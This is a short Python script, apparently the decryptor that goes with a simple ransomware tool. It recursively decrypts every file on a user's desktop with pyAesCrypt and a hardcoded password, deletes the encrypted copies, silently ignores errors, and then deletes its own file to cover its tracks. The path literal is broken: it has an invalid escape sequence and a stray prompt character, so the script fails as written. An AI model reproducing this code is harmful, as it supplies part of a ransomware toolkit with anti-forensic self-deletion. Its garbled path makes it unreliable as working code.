
import os
from sys import argv
from pyAesCrypt import decryptFile
def decrypt(file):
	print("---------------------------------------------------------------")
	password = "1256" 
	bufferSize = 128*1024
	decryptFile(file, os.path.splitext(file)[0], password, bufferSize)
	print("[decrypted] '{name}'".format(name = os.path.splitext(file)[0]))
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name) 
		if os.path.isfile(path): 
			try: decrypt(path)
			except: pass 
		else: walk(path)
walk("C:\Users\user\Desktop>")
print("---------------------------------------------------------------")
os.remove(argv[0])
